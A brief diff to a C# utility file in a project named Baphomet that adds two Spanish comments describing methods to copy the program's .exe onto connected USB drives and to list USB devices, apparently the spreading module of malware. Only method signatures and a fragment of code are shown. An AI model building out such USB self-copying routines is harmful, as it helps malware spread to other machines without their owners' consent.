@@ -36,6 +36,7 @@ namespace Baphomet.Utilities
             }
         }
 
+        //Metodo para copiar el .exe en las unidades usb
         public void AutoCopy(List<UsbDeviceDTO> usbDevice)
         {
             var source = Directory.GetCurrentDirectory();
@@ -61,6 +62,7 @@ namespace Baphomet.Utilities
             }
         }
 
+        //Metodo para obtener lista de dispositivos usb conectados en la maquina.
         public List<UsbDeviceDTO> GetUsbDevices()
         {
             List<UsbDeviceDTO> device = new List<UsbDeviceDTO>();
